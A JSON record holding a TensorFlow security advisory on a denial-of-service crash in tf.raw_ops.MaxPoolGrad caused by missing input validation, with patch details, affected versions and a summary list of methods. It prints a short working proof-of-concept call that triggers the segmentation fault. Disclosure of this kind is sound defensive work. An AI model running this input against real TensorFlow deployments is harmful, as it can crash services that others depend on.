{"description": "### Impact\nAn attacker can trigger a denial of service via a segmentation fault in `tf.raw_ops.MaxPoolGrad` caused by missing validation:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MaxPoolGrad(\n  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  ksize = [1, 16, 16, 1],\n  strides = [1, 16, 18, 1],\n  padding = \"EXPLICIT\",\n  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/maxpooling_op.cc) misses some validation for the `orig_input` and `orig_output` tensors.\n\nThe fixes for [CVE-2021-29579](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md) were incomplete.\n                                                                                                                                                                                                                                                                                          \n### Patches\nWe have patched the issue in GitHub commit [136b51f10903e044308cf77117c0ed9871350475](https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.", "methods": ["Missing validation in `MaxPoolGrad` function.", "Triggering a segmentation fault via a denial of service attack.", "Missing validation for `orig_input` and `orig_output` tensors.", "Incomplete patching of CVE-2021-29579."]}
